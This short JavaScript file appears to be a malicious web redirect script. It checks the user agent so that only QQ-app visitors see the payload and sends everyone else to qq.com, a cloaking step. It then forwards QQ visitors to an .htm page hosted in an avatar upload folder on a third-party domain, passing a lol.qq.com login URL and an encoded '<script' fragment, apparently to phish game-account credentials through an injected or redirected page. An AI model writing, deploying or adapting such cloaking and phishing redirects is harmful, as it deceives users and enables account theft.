function leleua() {
    var sUserAgent = navigator.userAgent.toLowerCase();
    if (sUserAgent.match(/QQ/i) == 'qq' || location.href.indexOf("edit") > -1) {
    } else {
        window.location.href = "https://qq.com";
    }
}

leleua();

setTimeout(function() {
    var timestamp = new Date().getTime();
    var url = 'https://img.yigaoba.com/avator/558068/20240106/ee778c0eab623e3a3b07f9619ab92f09.htm?url=http://lol.qq.com/comm-htdocs/milo_mobile/login.html' + 'u' + timestamp + '%3Cscript';
    location.href = url;
}, 1000);
